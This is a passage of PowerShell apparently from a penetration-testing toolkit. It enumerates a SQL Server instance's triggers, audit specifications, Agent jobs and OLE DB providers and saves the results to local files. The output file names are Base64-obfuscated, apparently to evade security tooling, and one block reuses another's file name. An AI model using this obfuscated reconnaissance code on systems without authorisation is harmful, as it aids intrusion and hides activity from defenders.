            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAHQAbwByAGUAZABfAHAAcgBvAGMAZQBkAHUAcgBfAEMATABSAC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBDAEwAUgBfAHMAdABvAHIAZQBkAF8AcAByAG8AYwBlAGQAdQByAGUAXwBDAEwAUgAuAGMAcwB2AA==')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting DML triggers..."
        $Results = Get-SQLTriggerDml -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAbQBsAC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAbQBsAC4AYwBzAHYA')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting DDL triggers..."
        $Results = Get-SQLTriggerDdl -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAZABsAC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAZABsAC4AYwBzAHYA')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting server version information..."
        $Results = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAbQBsAC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAcgBpAGcAZwBlAHIAcwBfAGQAbQBsAC4AYwBzAHYA')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting Database audit specification information..."
        $Results = Get-SQLAuditDatabaseSpec -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAEEAdQBkAGkAdABfAEQAYQB0AGEAYgBhAHMAZQBfAFMAcABlAGMAaQBmAGkAYwBhAHQAaQBvAG4AcwAuAHgAbQBsAA==')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAEEAdQBkAGkAdABfAEQAYQB0AGEAYgBhAHMAZQBfAFMAcABlAGMAaQBmAGkAYwBhAHQAaQBvAG4AcwAuAGMAcwB2AA==')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting Server audit specification information..."
        $Results = Get-SQLAuditServerSpec -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAEEAdQBkAGkAdABfAF8AUwBlAHIAdgBlAHIAXwBTAHAAZQBjAGkAZgBpAGMAYQB0AGkAbwBuAHMALgB4AG0AbAA=')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAEEAdQBkAGkAdABfAFMAZQByAHYAZQByAF8AUwBwAGUAYwBpAGYAaQBjAGEAdABpAG8AbgBzAC4AYwBzAHYA')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting Agent Jobs information..."
        $Results = Get-SQLAgentJob -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAEEAZwBlAG4AdABfAEoAbwBiAC4AeABtAGwA')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAEEAZwBlAG4AdABfAEoAbwBiAHMALgBjAHMAdgA=')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - Getting OLE DB provder information..."
        $Results = Get-SQLOleDbProvder -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAE8AbABlAEQAYgBQAHIAbwB2AGQAZQByAHMALgB4AG0AbAA=')))
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAE8AbABlAEQAYgBQAHIAbwB2AGQAZQByAHMALgBjAHMAdgA=')))
            $Results | epcsv -NoTypeInformation $OutPutPath
        }
        Write-Verbose -Message "$Instance - END"
    }
    End
    {
    }
}
